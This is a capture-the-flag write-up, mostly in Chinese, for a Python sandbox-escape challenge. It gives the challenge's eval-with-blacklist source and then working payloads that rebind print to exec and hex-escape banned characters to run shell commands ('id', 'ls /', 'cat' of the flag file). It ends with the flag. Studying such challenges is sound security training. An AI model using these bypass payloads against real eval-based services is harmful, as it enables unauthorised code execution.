#Web 

## 題目

**nocall**
請連線至服務，取得 flag。
`nc chals1 20027`

```python
#!/usr/local/bin/python3
import unicodedata

print(open(__file__).read())

expr = unicodedata.normalize("NFKC", input("> "))

if "._" in expr:
    raise NameError("no __ %r" % expr)

if "breakpoint" in expr:
    raise NameError("no breakpoint %r" % expr)

if any([x in "([ ])" for x in expr]):
    raise NameError("no ([ ]) %r" % expr)

# baby version: response for free OUO
result = eval(expr)
print(result)
```


## 解題
1. 觀察題目：
	NFKC 正規化輸入，禁止：
	1. `._`：
	2. breakpoint
	3. `(`、`)`、`[`、`]`、空白
	最後 `eval(expr)` 執行表達式 -> 可操作 `expr`
2. 一般的 pyjail escape 
   ```python
   "[].__class__.__base__.__subclasses__()[155].__init__.__globals__['system']('id')", {"__builtins__":{}}
   ```
   會被過濾 -> 用其他方法繞過
3. 利用 `:=` 覆寫 `print` 為 `exec`，使 `print(result)` 等價於 `exec(result)`，再用 `and` 控制 `eval` 的輸入
   ```python
   __import__('os').system('id')
   ```
   變
   ```python
   {print:=exec}and"__import__\x28'os'\x29.system\x28'id'\x29"
   ```
4. 依次檢查
   ```python
	{print:=exec}and"__import__\x28'os'\x29.system\x28'ls\x20/'\x29"
   ```
   ![[W4-1_ls.png|397]]
   ```python
   	{print:=exec}and"__import__\x28'os'\x29.system\x28'cat\x20/flag_F1DwTSDu'\x29"
   ```
   ![[W4-1_flag.png]]
5. flag = `CTF{you_can_overwrite_builtins_to_call_without_()}`


